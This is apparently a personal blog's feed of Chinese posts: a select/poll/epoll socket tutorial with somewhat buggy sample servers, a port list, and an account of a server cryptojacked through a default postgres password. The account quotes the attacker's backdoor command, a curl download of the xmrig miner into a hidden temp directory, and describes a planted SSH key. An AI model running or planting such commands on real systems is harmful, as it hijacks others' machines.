failed&quot;);        exit(EXIT_FAILURE);    &#125;    //set master socket to allow multiple connections ,    //this is just a good habit, it will work without this    if( setsockopt(welcome_socket, SOL_SOCKET, SO_REUSEADDR, (char *)&amp;opt,                   sizeof(opt)) &lt; 0 )    &#123;        perror(&quot;setsockopt&quot;);        exit(EXIT_FAILURE);    &#125;    //type of socket created    address.sin_family = AF_INET;    address.sin_addr.s_addr = INADDR_ANY;    address.sin_port = htons( port );    //bind the socket to localhost port 8888    if (bind(welcome_socket, (struct sockaddr *)&amp;address, sizeof(address))&lt;0)    &#123;        perror(&quot;bind failed&quot;);        exit(EXIT_FAILURE);    &#125;    printf(&quot;Listener on port %d \n&quot;, port);    //try to specify maximum of 3 pending connections for the master socket    if (listen(welcome_socket, 3) &lt; 0)    &#123;        perror(&quot;listen&quot;);        exit(EXIT_FAILURE);    &#125;    //accept the incoming connection    addrlen = sizeof(address);    puts(&quot;Waiting for connections ...&quot;);    while(true)    &#123;        //clear the socket set        FD_ZERO(&amp;readfds);        //add master socket to set        FD_SET(welcome_socket, &amp;readfds);        max_sd = welcome_socket;        //add child sockets to set        for ( i = 0 ; i &lt; max_clients ; i++)        &#123;            //socket descriptor            sd = client_socket[i];            //if valid socket descriptor then add to read list            if(sd &gt; 0)                FD_SET( sd , &amp;readfds);            //highest file descriptor number, need it for the select function            if(sd &gt; max_sd)                max_sd = sd;        &#125;        //wait for an activity on one of the sockets , timeout is NULL ,        //so wait indefinitely        activity = select( max_sd + 1 , &amp;readfds , nullptr , nullptr , nullptr);        if ((activity &lt; 0) &amp;&amp; (errno!=EINTR))        &#123;            printf(&quot;select error&quot;);        &#125;        //If something happened on the master socket ,        //then its an incoming connection        if (FD_ISSET(welcome_socket, &amp;readfds))        &#123;            if ((new_socket = accept(welcome_socket,                                     (struct sockaddr *)&amp;address, (socklen_t*)&amp;addrlen))&lt;0)            &#123;                perror(&quot;accept&quot;);                exit(EXIT_FAILURE);            &#125;            //inform user of socket number - used in send and receive commands            printf(&quot;New connection , socket fd is %d , ip is : %s , port : %d\n&quot;,                   new_socket , inet_ntoa(address.sin_addr) , ntohs(address.sin_port));            //send new connection greeting message            if( send(new_socket, message, strlen(message), 0) != strlen(message) )            &#123;                perror(&quot;send&quot;);            &#125;            puts(&quot;Welcome message sent successfully&quot;);            //add new socket to array of sockets            for (i = 0; i &lt; max_clients; i++)            &#123;                //if position is empty                if( client_socket[i] == 0 )                &#123;                    client_socket[i] = new_socket;                    printf(&quot;Adding to list of sockets as %d\n&quot; , i);                    break;                &#125;            &#125;        &#125;        //else its some IO operation on some other socket        for (i = 0; i &lt; max_clients; i++)        &#123;            sd = client_socket[i];            if (FD_ISSET( sd , &amp;readfds))            &#123;                //Check if it was for closing , and also read the                //incoming message                if ((valread = read( sd , buffer, 1024)) == 0)                &#123;                    //Somebody disconnected , get his details and print                    getpeername(sd , (struct sockaddr*)&amp;address , \                        (socklen_t*)&amp;addrlen);                    printf(&quot;Host disconnected , ip %s , port %d \n&quot; ,                           inet_ntoa(address.sin_addr) , ntohs(address.sin_port));                    //Close the socket and mark as 0 in list for reuse                    close( sd );                    client_socket[i] = 0;                &#125;                //Echo back the message that came in                else                &#123;                    //set the string terminating NULL byte on the end                    //of the data read                    buffer[valread] = &#39;r&#39;;                    buffer[valread + 1] = &#39;\0&#39;;                    printf(&quot;%s %d\n&quot;, buffer, count++);                    send(sd , buffer , strlen(buffer) , 0 );                &#125;            &#125;        &#125;    &#125;    return 0;&#125;</code></pre><h3 id="（4）优缺点"><a href="#（4）优缺点" class="headerlink" title="（4）优缺点"></a>（4）优缺点</h3><p>优点：</p><ul><li><p>IO复用</p></li><li><p>适用于并发量小的场景，性能强</p></li></ul><p>缺点：</p><ul><li>支持的文件描述符只有1024。由于采用轮询的方式，因此调大该数值的意义不大。</li><li>只要连接没有关闭，即使没有活动，也会被遍历到，每次都要遍历所有socket，连接数越多性能越差。</li><li>每次循环之前需要拷贝socket</li></ul><h3 id="（5）pselect"><a href="#（5）pselect" class="headerlink" title="（5）pselect"></a>（5）pselect</h3><p>pselect和select基本一样，在select的基础上有两处变化：</p><ul><li>timeout结构体从timeval（秒+微秒）改成了timespec（秒+纳秒）</li><li>新增了一个__sigmask信号掩码参数</li></ul><p>嗯，不太懂。</p><h3 id="（6）注意点"><a href="#（6）注意点" class="headerlink" title="（6）注意点"></a>（6）注意点</h3><ul><li>select对于没有结束的事件，在下一次轮询中还会继续活跃。比如第一次read指定长度的buffer，但是客户端发送的数据包很大，一个buffer没有读完，因此在下一次循环中该socket依然是活跃的，可以继续从socket中读取数据。</li><li>select本质上是针对文件描述符的，因此也可以多个文件的读写进行IO复用，但很少这样用。</li></ul><h2 id="9、poll"><a href="#9、poll" class="headerlink" title="9、poll"></a>9、poll</h2><p>poll和select在本质上没有区别，也是管理多个socket然后进行轮询，根据socket的状态进行处理。</p><p>poll使用的数据结构是<code>pollfd</code>，一个封装了socket的机构体。</p><pre><code class="c++">/* Data structure describing a polling request.  */struct pollfd  &#123;    // socket    int fd;            /* File descriptor to poll.  */    // 用户注册的需要监听的事件    short int events;        /* Types of events poller cares about.  */    // 实际在socket上发生的事件    short int revents;        /* Types of events that actually occurred.  */  &#125;;</code></pre><p>事件共有以下几种：</p><pre><code class="c++">// 常用事件/* Event types that can be polled for.  These bits may be set in `events&#39;   to indicate the interesting event types; they will appear in `revents&#39;   to indicate the status of the file descriptor.  */#define POLLIN        0x001        /* There is data to read.  */#define POLLPRI        0x002        /* There is urgent data to read.  */#define POLLOUT        0x004        /* Writing now will not block.  */// revents事件如下，revents事件不能用于events，用于表示socket状态/* Event types always implicitly polled for.  These bits need not be set in   `events&#39;, but they will appear in `revents&#39; to indicate the status of   the file descriptor.  */#define POLLERR        0x008        /* Error condition.  */#define POLLHUP        0x010        /* Hung up.  */#define POLLNVAL    0x020        /* Invalid polling request.  */</code></pre><p>poll方法从一个pollfd数组中，获取出和用户注册的事件一致的一个socket。poll方法如下：</p><ul><li>返回值 = 1，即活跃的socket</li><li>返回值 = 0，超时</li><li>返回值 = -1，出现异常</li></ul><pre><code class="c++">/* Poll the file descriptors described by the NFDS structures starting at   FDS.  If TIMEOUT is nonzero and not -1, allow TIMEOUT milliseconds for   an event to occur; if TIMEOUT is -1, block until an event occurs.   Returns the number of file descriptors with events, zero if timed out,   or -1 for errors.   This function is a cancellation point and therefore not marked with   __THROW.  */extern int poll (struct pollfd *__fds, nfds_t __nfds, int __timeout);</code></pre><p>poll代码和select也差不多，如下：</p><pre><code class="c++">int poll_server(int port) &#123;    int MAX_CONNECTION = 1024;    int max_fd;    struct sockaddr_in addr&#123;&#125;;    int addr_len = sizeof(addr);    char buffer[1024];    char response[1024] = &quot;hello&quot;;    int count = 0;    int welcome_socket = create_welcome_socket(port);    cout &lt;&lt; &quot;welcome_socket:&quot; &lt;&lt; welcome_socket &lt;&lt; endl;    struct pollfd fds[MAX_CONNECTION];    // 初始化，将fd设置为-1    // 对于poll函数，若fd为-1，则会被忽略    for (int i = 0; i &lt; MAX_CONNECTION; i++) fds[0].fd = -1;    // 初始化welcome_socket    fds[welcome_socket].fd = welcome_socket;    // 为welcome_socket注册可读事件    fds[welcome_socket].events = POLLIN;    max_fd = welcome_socket;    while (true) &#123;        int activity = poll(fds, max_fd + 1, -1);        if (activity &lt; 0) &#123;            printf(&quot;poll error!\n&quot;);            break;        &#125;        for (int i = 0; i &lt;= max_fd; ++i) &#123;            pollfd f = fds[i];            if (f.fd == -1) continue;            if (f.revents != POLLIN) continue;            if (f.fd == welcome_socket) &#123;                // 处理welcome_socket                // (struct sockaddr *)&amp;addr, (socklen_t *)(sizeof(addr))                int new_connection = accept(welcome_socket, (struct sockaddr *)&amp;addr, (socklen_t*)&amp;addr_len);                if (new_connection &lt; 0) &#123;                    printf(&quot;accept error!\n&quot;);                    continue;                &#125;                cout &lt;&lt; &quot;new socket:&quot; &lt;&lt; new_connection &lt;&lt; endl;                //inform user of socket number - used in send and receive commands                printf(&quot;New connection , socket:%d , ip:%s , port:%d\n&quot;,                       new_connection , inet_ntoa(addr.sin_addr) , ntohs(addr.sin_port));                fds[new_connection].fd = new_connection;                fds[new_connection].events = POLLIN;                max_fd = max(max_fd, new_connection);                f.events = POLLIN;                cout &lt;&lt; &quot;max_fd:&quot; &lt;&lt; max_fd &lt;&lt; endl;            &#125;else &#123;                cout &lt;&lt; &quot;fd:&quot; &lt;&lt; f.fd &lt;&lt; endl;                if (f.revents == POLLIN) &#123;                    // 处理读事件                    int size = read(f.fd, buffer, sizeof(buffer));                    if (size &lt;= 0) &#123;                        getpeername(f.fd, (struct sockaddr *)&amp;addr, (socklen_t*)&amp;addr_len);                        printf(&quot;client disconnected, ip:%s, port:%d\n&quot;,                               inet_ntoa(addr.sin_addr) , ntohs(addr.sin_port));                        if (max_fd == f.fd) &#123;                            for (int j = max_fd - 1; j &gt; 0; --j) &#123;                                if (fds[j].fd != -1) &#123;                                    max_fd = fds[j].fd;                                    break;                                &#125;                            &#125;                        &#125;                        cout &lt;&lt; &quot;max_fd:&quot; &lt;&lt; max_fd &lt;&lt; endl;                        close(f.fd);                        f.fd = -1;                    &#125;else &#123;                        printf(&quot;接收消息%d:%s\n&quot;, count++, buffer);                        buffer[size] = &#39;\0&#39;;                        size = send(f.fd, buffer, strlen(buffer), 0);                        if (size &lt; 0) &#123;                            printf(&quot;write error!\n&quot;);                        &#125;                        // 将该socket重新注册监听可读事件                        f.events = POLLIN;                    &#125;                &#125;            &#125;        &#125;    &#125;    return 0;&#125;</code></pre><p>poll的缺点：</p><ul><li>没有避免拷贝socket这个环节</li><li>依然采用轮询的方式，连接数越多性能越差</li></ul><h2 id="10、epoll"><a href="#10、epoll" class="headerlink" title="10、epoll"></a>10、epoll</h2><h3 id="（1）简介"><a href="#（1）简介" class="headerlink" title="（1）简介"></a>（1）简介</h3><p>为解决以上select和poll轮询的缺点，epoll出现了。</p><p>epoll的本质不是主动轮询找到活跃的fd，而是使用系统内核在每个fd上的回调函数实现的。即当有fd活跃时，会触发系统内核的一个callback函数，加入到Ready队列中，并通知应用程序来处理这个事件。因此应用程序只要无限循环处理这个Ready队列中的fd即可。</p><p>epoll的两种工作模式：</p><ul><li>level triggered：水平触发，即当一个fd就绪时，内核会通知你，并且直到该fd事件完全结束。假如你读取了一部分数据，还剩一部分数据没读取，内核会继续通知这个事件。select和poll都是这种工作模式。支持block和no-block socket。</li><li>edge triggered：边缘触发，即当一个fd就绪时，内核会通知你，直到你做了某些操作导致这个fd不再时就绪状态，比如读取了一半数据的fd，并不是就绪状态，后面内核就不再通知这个事件了。除非下一次IO又开始了。只支持non-block socket。这种方式会导致代码变得复杂，并且容易丢失数据。</li></ul><p>man文档是这样举例的：</p><p>当一个IO事件如下时，若该fd注册到epoll中使用的是edge triggered时，下面第5步不会是就绪状态，而是阻塞状态。尽管在fd中还有可用数据。同时客户端会一直等待服务器针对这次IO的响应消息。但如果注册到epoll中使用的是level triggered时，第5步则会是就绪状态，即内核还会继续通知应用程序该fd事件。</p><ul><li>1.将一个read fd注册到epoll实例上</li><li>2.read fd对应的客户端发送一个2kb的数据包给read fd</li><li>3.epoll_wait就绪（解除阻塞）并且返回对应的fd给应用程序</li><li>4.应用程序只读取了1kb的数据</li><li>5.由于事件未结束，因此下一次调用epoll_wait函数时也是就绪状态。</li></ul><h3 id="（2）epoll使用的结构体和系统调用"><a href="#（2）epoll使用的结构体和系统调用" class="headerlink" title="（2）epoll使用的结构体和系统调用"></a>（2）epoll使用的结构体和系统调用</h3><p>结构体：</p><ul><li>epoll_event：epoll适用的事件结构体，events属性表示具体事件类型，data又是一个结构体，fd就是该事件对应的socket</li></ul><p>函数：</p><ul><li><p>epoll_create：创建一个epoll实例，需要将其他socket与之关联在一起</p></li><li><p>epoll_create1：同epoll_create，去掉了size参数，加上了flags参数</p></li><li><p>epoll_ctl：对epoll_fd进行操作，op参数为操作类型，可以新增、删除、修改一个普通fd的绑定关系。</p></li><li><p>epoll_wait：等待与epoll_fd绑定的fd上的事件，当有事件发生时解除阻塞，并返回事件数量</p></li></ul><pre><code class="c++">struct epoll_event&#123;  uint32_t events;    /* Epoll events */  epoll_data_t data;    /* User data variable */&#125; __EPOLL_PACKED;typedef union epoll_data&#123;  void *ptr;  int fd;  uint32_t u32;  uint64_t u64;&#125; epoll_data_t;/* Creates an epoll instance.  Returns an fd for the new instance.   The &quot;size&quot; parameter is a hint specifying the number of file   descriptors to be associated with the new instance.  The fd   returned by epoll_create() should be closed with close().  */extern int epoll_create (int __size) __THROW;/* Same as epoll_create but with an FLAGS parameter.  The unused SIZE   parameter has been dropped.  */extern int epoll_create1 (int __flags) __THROW;/* Manipulate an epoll instance &quot;epfd&quot;. Returns 0 in case of success,   -1 in case of error ( the &quot;errno&quot; variable will contain the   specific error code ) The &quot;op&quot; parameter is one of the EPOLL_CTL_*   constants defined above. The &quot;fd&quot; parameter is the target of the   operation. The &quot;event&quot; parameter describes which events the caller   is interested in and any associated user data.  */extern int epoll_ctl (int __epfd, int __op, int __fd,              struct epoll_event *__event) __THROW;/* Valid opcodes ( &quot;op&quot; parameter ) to issue to epoll_ctl().  */#define EPOLL_CTL_ADD 1    /* Add a file descriptor to the interface.  */#define EPOLL_CTL_DEL 2    /* Remove a file descriptor from the interface.  */#define EPOLL_CTL_MOD 3    /* Change file descriptor epoll_event structure.  *//* Wait for events on an epoll instance &quot;epfd&quot;. Returns the number of   triggered events returned in &quot;events&quot; buffer. Or -1 in case of   error with the &quot;errno&quot; variable set to the specific error code. The   &quot;events&quot; parameter is a buffer that will contain triggered   events. The &quot;maxevents&quot; is the maximum number of events to be   returned ( usually size of &quot;events&quot; ). The &quot;timeout&quot; parameter   specifies the maximum wait time in milliseconds (-1 == infinite).   This function is a cancellation point and therefore not marked with   __THROW.  */extern int epoll_wait (int __epfd, struct epoll_event *__events,               int __maxevents, int __timeout);</code></pre><h3 id="（3）epoll代码流程"><a href="#（3）epoll代码流程" class="headerlink" title="（3）epoll代码流程"></a>（3）epoll代码流程</h3><p>1、创建welcome_socket，将welcome_socket设置为非阻塞</p><p>2、使用epoll_create1方法创建一个epoll_fd</p><p>3、将welcome_socket和epoll_fd绑定</p><p>4、调用epoll_wait方法，获取对应的时间数量nfds</p><p>5、0-nfds循环，对事件进行处理，若为welcome_socket则获取连接socket，设置为非阻塞，绑定epoll_fd；若为连接socket则执行IO</p><h3 id="（4）完整代码"><a href="#（4）完整代码" class="headerlink" title="（4）完整代码"></a>（4）完整代码</h3><pre><code class="c++">static int make_socket_non_blocking (int sfd)&#123;    int flags, s;    flags = fcntl (sfd, F_GETFL, 0);    if (flags == -1)    &#123;        perror (&quot;fcntl&quot;);        return -1;    &#125;    flags |= O_NONBLOCK;    s = fcntl (sfd, F_SETFL, flags);    if (s == -1)    &#123;        perror (&quot;fcntl&quot;);        return -1;    &#125;    return 0;&#125;int epoll_server(int port) &#123;    int MAX_CONNECTION = 10;    struct epoll_event ev&#123;&#125;;    struct epoll_event *events;    int conn_sock, nfds, epollfd;    struct sockaddr_in addr&#123;&#125;;    int addr_len = sizeof(addr);    int count = 0;    events = static_cast&lt;epoll_event *&gt;(calloc(MAX_CONNECTION, sizeof(ev)));    int welcome_socket = create_welcome_socket(port);    int s = make_socket_non_blocking(welcome_socket);    if (s == -1)        abort();    epollfd = epoll_create1(0);    if (epollfd == -1) &#123;        perror(&quot;epoll_create1&quot;);        exit(EXIT_FAILURE);    &#125;    ev.events = EPOLLIN;    ev.data.fd = welcome_socket;    if (epoll_ctl(epollfd, EPOLL_CTL_ADD, welcome_socket, &amp;ev) == -1) &#123;        perror(&quot;epoll_ctl: listen_sock&quot;);        exit(EXIT_FAILURE);    &#125;    for (;;) &#123;        nfds = epoll_wait(epollfd, events, MAX_CONNECTION, -1);        if (nfds == -1) &#123;            perror(&quot;epoll_wait&quot;);            exit(EXIT_FAILURE);        &#125;        for (int i = 0; i &lt; nfds; ++i) &#123;            if (events[i].data.fd == welcome_socket) &#123;                conn_sock = accept(welcome_socket, (struct sockaddr *) &amp;addr, (socklen_t *)&amp;addr_len);                if (conn_sock == -1) &#123;                    perror(&quot;accept&quot;);                    exit(EXIT_FAILURE);                &#125;                make_socket_non_blocking(conn_sock);                ev.events = EPOLLIN | EPOLLET;                ev.data.fd = conn_sock;                if (epoll_ctl(epollfd, EPOLL_CTL_ADD, conn_sock, &amp;ev) == -1) &#123;                    perror(&quot;epoll_ctl: conn_sock&quot;);                    exit(EXIT_FAILURE);                &#125;            &#125; else &#123;                int done = 0;                while (true)                &#123;                    ssize_t size;                    char *buffer[1024];                    getpeername(events[i].data.fd, (struct sockaddr *)&amp;addr, (socklen_t*)&amp;addr_len);                    size = read (events[i].data.fd, buffer, sizeof(buffer));                    if (size == -1)                    &#123;                        /* If errno == EAGAIN, that means we have read all                           data. So go back to the main loop. */                        if (errno != EAGAIN)                        &#123;                            perror (&quot;read&quot;);                            done = 1;                        &#125;                        break;                    &#125;                    else if (size == 0)                    &#123;                        /* End of file. The remote has closed the                           connection. */                        done = 1;                        break;                    &#125;                    printf(&quot;收到消息[%d] [ip:%s] [port:%d] - %s\n&quot;,                           count++, inet_ntoa(addr.sin_addr) , ntohs(addr.sin_port), buffer);                    /* Write the buffer to standard output */                    s = send(events[i].data.fd, buffer, size, 0);                    if (s == -1)                    &#123;                        perror (&quot;write&quot;);                        abort ();                    &#125;                &#125;                if (done)                &#123;                    printf (&quot;Closed connection on descriptor %d\n&quot;,                            events[i].data.fd);                    /* Closing the descriptor will make epoll remove it                       from the set of descriptors which are monitored. */                    close (events[i].data.fd);                &#125;            &#125;        &#125;    &#125;&#125;</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本学习笔记基于ubuntu18+cpp14中socket代码，学习socket。&lt;/p&gt;
&lt;p&gt;最权威的文档：man命令。&lt;/p&gt;
&lt;h2 id=&quot;1、socket是什么&quot;&gt;&lt;a href=&quot;#1、socket是什么&quot; class=&quot;headerlink&quot; title=&quot;1</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://yury757.github.io/%E5%B8%B8%E7%94%A8%E7%BB%84%E4%BB%B6%E7%AB%AF%E5%8F%A3%E5%8F%B7"/>
    <id>https://yury757.github.io/%E5%B8%B8%E7%94%A8%E7%BB%84%E4%BB%B6%E7%AB%AF%E5%8F%A3%E5%8F%B7</id>
    <published>2022-04-05T03:26:06.484Z</published>
    <updated>2022-04-05T04:21:04.106Z</updated>
    
    <content type="html"><![CDATA[<h1 id="常用组件端口号"><a href="#常用组件端口号" class="headerlink" title="常用组件端口号"></a>常用组件端口号</h1><h2 id="大数据"><a href="#大数据" class="headerlink" title="大数据"></a>大数据</h2><h3 id="zookeeper"><a href="#zookeeper" class="headerlink" title="zookeeper"></a>zookeeper</h3><p>2181：客户端连接</p><p>2888：follower与leader的rpc通信</p><p>3888：选举</p><h3 id="hadoop"><a href="#hadoop" class="headerlink" title="hadoop"></a>hadoop</h3><p>9870：web管理页面</p><p>8088：yarn的web管理页面</p><p>9000：hdfs客户端连接，<code>hdfs://myubuntu1:9000</code></p><h3 id="hbase"><a href="#hbase" class="headerlink" title="hbase"></a>hbase</h3><p>16010：web管理页面</p><p>8080：REST web服务</p><h3 id="kafka"><a href="#kafka" class="headerlink" title="kafka"></a>kafka</h3><p>9092：客户端连接</p><h3 id="flink"><a href="#flink" class="headerlink" title="flink"></a>flink</h3><p>8081：web管理页面</p><h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h3><p>3306：客户端连接</p><h3 id="postgresql"><a href="#postgresql" class="headerlink" title="postgresql"></a>postgresql</h3><p>5432：客户端连接</p><h3 id="clickhouse"><a href="#clickhouse" class="headerlink" title="clickhouse"></a>clickhouse</h3><p>8123：http访问数据库端口，java程序、数据库IDE连接clickhouse时用这个</p><p>9003：tcp访问数据库端口，clickhouse-client客户端访问时使用的端口</p><p>9004：使用MySQL客户端连接clickhouse数据库时使用的端口</p><p>9009：replica之间通信使用的端口</p><p>9100：gRPC协议端口</p><h2 id="服务器运维"><a href="#服务器运维" class="headerlink" title="服务器运维"></a>服务器运维</h2><h3 id="grafana"><a href="#grafana" class="headerlink" title="grafana"></a>grafana</h3><p>3000：web页面访问</p><p>账户密码默认都是admin</p><h3 id="prometheus"><a href="#prometheus" class="headerlink" title="prometheus"></a>prometheus</h3><p>9090：web访问端口</p><p>9100：node_exporter的指标web访问端口，需要独立额外启动node_exporter</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;常用组件端口号&quot;&gt;&lt;a href=&quot;#常用组件端口号&quot; class=&quot;headerlink&quot; title=&quot;常用组件端口号&quot;&gt;&lt;/a&gt;常用组件端口号&lt;/h1&gt;&lt;h2 id=&quot;大数据&quot;&gt;&lt;a href=&quot;#大数据&quot; class=&quot;headerlink&quot; title=</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://yury757.github.io/linux/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A2%AB%E6%8C%96%E7%9F%BF%E7%9A%84%E7%BB%8F%E5%8E%86"/>
    <id>https://yury757.github.io/linux/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A2%AB%E6%8C%96%E7%9F%BF%E7%9A%84%E7%BB%8F%E5%8E%86</id>
    <published>2022-03-18T11:39:18.700Z</published>
    <updated>2022-03-28T15:24:01.689Z</updated>
    
    <content type="html"><![CDATA[<h1 id="记最近服务器被挖矿的经历"><a href="#记最近服务器被挖矿的经历" class="headerlink" title="记最近服务器被挖矿的经历"></a>记最近服务器被挖矿的经历</h1><p>最近服务器三次被挖矿了。</p><h2 id="第一次"><a href="#第一次" class="headerlink" title="第一次"></a>第一次</h2><p>在服务器上安装了postgres数据库，为了方便，使用默认密码postgres，并在配置中设置<code>listen_addresses = *</code>方便远程房访问数据库，认为应该没人会来攻击我。结果没过几天，服务器就被植入了挖矿程序，阿里云报警。</p><p>top再P查看CPU占用最高的进程，是一个以postgres用户运行的<code>.ddns</code>进程。</p><p>前往<code>/proc/&#123;pid&#125;</code>查看挖矿进程运行的命令和可执行文件所在路径，定位到linux临时目录<code>var/tmp/</code>下。</p><p><code>ll -a</code>查看所有文件，红框框内的都是挖矿程序使用的目录。果断全部删光光。然后<code>ps aux | grep postgres</code>将对应的可疑进程都kill掉。</p><p>我本以为把进程全部kill掉，再把这些可执行文件删光就可以了，然后将密码改成自己常用的复杂密码就可以了，果然还是太年轻，于是就出现了第二次被挖矿的经历了。</p><p><img src="/images/vartmp%E7%9B%AE%E5%BD%95.png"></p><h2 id="第二次"><a href="#第二次" class="headerlink" title="第二次"></a>第二次</h2><p>第二次，没有任何预期，阿里云又报服务器被挖矿的消息。依然和上次一样把进程干掉，并挖矿程序删除掉。</p><p>当时比较忙，没想太多，以为就是黑客把我密码爆破了，然后植入了挖矿程序。</p><p>然后在avast上（<a href="https://www.avast.com/zh-cn/random-password-generator%EF%BC%89%E6%8A%8A%E5%AF%86%E7%A0%81%E6%8D%A2%E6%88%90%E4%BA%86%E9%9A%8F%E6%9C%BA%E5%AF%86%E7%A0%81%E3%80%82">https://www.avast.com/zh-cn/random-password-generator）把密码换成了随机密码。</a></p><h2 id="第三次"><a href="#第三次" class="headerlink" title="第三次"></a>第三次</h2><p>第三次，当我用服务器用得正爽时，阿里云又通知我被入侵了，我一下子来兴趣了，我想看看这个人到底为什么能一直入侵我。</p><p>经历上面两次入侵，我在想以下两个问题：</p><p>1、为什么我改了postgres的密码，还能被入侵？思考：是不是某个地方泄露了我的密码？</p><p>2、为什么这次被入侵的又是postgres用户？思考：如果黑客是以爆破密码的方式入侵我的服务器，那为什么不爆破root用户。</p><p>3、这次入侵时，我刚好在用postgres用户导出数据，用postgres用户往本地传输了一份文件，难道是我以postgres登录时泄露了密码？</p><p><img src="/images/%E5%A4%8D%E5%88%B6%E6%96%87%E4%BB%B6%E6%88%AA%E5%9B%BE.jpg"></p><p>基于以上两点，我很怀疑我的postgres用户的密码泄露了，但是我还是linux小白，于是只能在google上寻找答案。</p><p>找了很久，翻了一些被人被入侵的博文，原因大致就是，被入侵后，黑客在服务器上留了一些后门：</p><p><strong><font color="Red">重点：</font></strong></p><p>1、黑客在postgres用户目录下保存了ssh公钥（**.ssh/authorized_keys**），这样他无需输入密码就可以远程登录。我这里就发现postgres用户下就有他的公钥，删除即可。</p><p>2、黑客在postgres用户目录下的<code>.bash_profile</code>、<code>.bash_login</code>、<code>.profile</code>、<code>.bashrc</code>、<code>.bash_logout</code>文件中添加了他自己的后门脚本代码。这样，在你登录或者退出登录时，都会执行他自己的后门脚本代码。于是我在我的服务器中发现了他的后门代码，原始代码已经找不到了（服务器到期了。。。），大致有一段如下：</p><pre><code class="shell">/bin/curl -fsSL -o /var/tmp/.crypto/.../xmr/ https://github.com/xmrig/xmrig/releases/download/v6.10.0/xmrig-6.10.0-linux-static-x64.tar.gz  </code></pre><p>这就能解释为什么我一用postgres用户登陆服务器后，就会被入侵了。</p><h2 id="黑客信息"><a href="#黑客信息" class="headerlink" title="黑客信息"></a>黑客信息</h2><p>此外我在黑客植入的<code>.crypto</code>目录下发现了一些黑客挖矿的日志文件，里面记载了一些ip啥的，通过一些IP查询的网站，能确定两个地区的ip，一个是欧洲一个国家，忘记名字了，另一个是美国。</p><p>由于服务器时间刚好到期，最近也比较忙，很多东西还没来得及发掘，服务器就没了，可惜。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;记最近服务器被挖矿的经历&quot;&gt;&lt;a href=&quot;#记最近服务器被挖矿的经历&quot; class=&quot;headerlink&quot; title=&quot;记最近服务器被挖矿的经历&quot;&gt;&lt;/a&gt;记最近服务器被挖矿的经历&lt;/h1&gt;&lt;p&gt;最近服务器三次被挖矿了。&lt;/p&gt;
&lt;h2 id=&quot;第一次&quot;&gt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>java常用配置</title>
    <link href="https://yury757.github.io/java/java%E5%B8%B8%E7%94%A8%E9%85%8D%E7%BD%AE"/>
    <id>https://yury757.github.io/java/java%E5%B8%B8%E7%94%A8%E9%85%8D%E7%BD%AE</id>
    <published>2021-12-24T16:00:00.000Z</published>
    <updated>2022-03-07T16:19:32.127Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1、pom"><a href="#1、pom" class="headerlink" title="1、pom"></a>1、pom</h2><pre><code class="xml">&lt;properties&gt;    &lt;maven.compiler.source&gt;8&lt;/maven.compiler.source&gt;    &lt;maven.compiler.target&gt;8&lt;/maven.compiler.target&gt;    &lt;java.version&gt;1.8&lt;/java.version&gt;    &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt;    &lt;project.report.outputEncoding&gt;UTF-8&lt;/project.report.outputEncoding&gt;&lt;/properties&gt;&lt;build&gt;    &lt;plugins&gt;        &lt;!-- jar包插件 --&gt;        &lt;plugin&gt;            &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;            &lt;artifactId&gt;maven-jar-plugin&lt;/artifactId&gt;            &lt;version&gt;3.2.0&lt;/version&gt;            &lt;configuration&gt;                &lt;excludes&gt; &lt;!-- 以下文件不打包 --&gt;                    &lt;exclude&gt;*.properties&lt;/exclude&gt;                    &lt;exclude&gt;*.xml&lt;/exclude&gt;                    &lt;exclude&gt;*.yml&lt;/exclude&gt;                    &lt;exclude&gt;*.yaml&lt;/exclude&gt;                    &lt;exclude&gt;*.config&lt;/exclude&gt;                &lt;/excludes&gt;                &lt;archive&gt;                    &lt;manifest&gt;                        &lt;addClasspath&gt;true&lt;/addClasspath&gt; &lt;!-- 是否要把依赖jar包加入到manifest中 --&gt;                        &lt;classpathPrefix&gt;lib/&lt;/classpathPrefix&gt; &lt;!-- 指定依赖jar包从classpath下指定路径查找 --&gt;                        &lt;mainClass&gt;net.yury.Test&lt;/mainClass&gt;                    &lt;/manifest&gt;                    &lt;manifestEntries&gt;                        &lt;Class-Path&gt;config/&lt;/Class-Path&gt; &lt;!-- 指定配置文件从classpath下的指定路径查找 --&gt;                    &lt;/manifestEntries&gt;                &lt;/archive&gt;            &lt;/configuration&gt;        &lt;/plugin&gt;        &lt;!-- 下面两个插件配置，可以执行一次，将所有jar包和配置文件拿到，部署到服务器后，就可以删掉了 --&gt;        &lt;!-- 将依赖jar包从maven仓库复制到指定目录的插件 --&gt;        &lt;plugin&gt;            &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;            &lt;artifactId&gt;maven-dependency-plugin&lt;/artifactId&gt;            &lt;version&gt;3.2.0&lt;/version&gt;            &lt;executions&gt;                &lt;execution&gt;                    &lt;id&gt;copy-lib&lt;/id&gt;                    &lt;phase&gt;package&lt;/phase&gt;                    &lt;goals&gt;                        &lt;goal&gt;copy-dependencies&lt;/goal&gt;                    &lt;/goals&gt;                    &lt;configuration&gt;                        &lt;outputDirectory&gt;target/lib&lt;/outputDirectory&gt;                        &lt;excludeTransitive&gt;false&lt;/excludeTransitive&gt;                        &lt;stripVersion&gt;false&lt;/stripVersion&gt;                        &lt;includeScope&gt;runtime&lt;/includeScope&gt;                    &lt;/configuration&gt;                &lt;/execution&gt;            &lt;/executions&gt;        &lt;/plugin&gt;        &lt;!-- 将配置文件从类文件中复制到指定目录的插件 --&gt;        &lt;plugin&gt;            &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;            &lt;artifactId&gt;maven-resources-plugin&lt;/artifactId&gt;            